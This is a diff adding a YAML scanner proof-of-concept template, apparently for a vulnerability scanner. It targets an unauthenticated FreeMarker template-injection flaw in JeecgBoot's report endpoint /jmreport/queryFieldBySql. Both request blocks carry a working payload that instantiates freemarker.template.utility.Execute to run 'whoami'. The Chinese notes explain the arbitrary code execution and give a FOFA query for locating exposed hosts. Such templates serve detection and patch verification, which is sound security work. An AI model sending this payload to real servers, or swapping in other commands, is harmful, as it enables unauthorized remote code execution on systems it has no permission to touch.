@@ -1,0 +1,30 @@
+name: jmreport-SSTI的任意代码执行漏洞
+groups:
+  poc1:
+    - method: POST
+      path: /jeecg-boot/jmreport/queryFieldBySql
+      follow_redirects: true
+      headers:
+        Content-Type: application/json;charset=utf-8
+      body: |
+        {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami \") }'" }
+      expression: |
+        response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"解析成功")
+  poc2:
+    - method: POST
+      path: /jimu/jmreport/queryFieldBySql
+      follow_redirects: true
+      headers:
+        Content-Type: application/json;charset=utf-8
+      body: |
+        {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami \") }'" }
+      expression: |
+        response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"解析成功")
+detail:
+  author: test
+  info: |
+    /jeecg-boot/是项目目录，有可能是其他的
+    JeecgBoot 受影响版本中由于积木报表 /jeecg-boot/jmreport/queryFieldBySql Api接口未进行身份校验，使用 Freemarker 处理用户用户传入的 sql 参数，未经授权的攻击者可发送包含恶意 sql 参数的 http 请求，通过 SSTI 在应用端执行任意代码。
+    fofa语法：body="jeecg-boot"
+  links:
+    - https://www.cnblogs.com/pursue-security/p/17665454.html
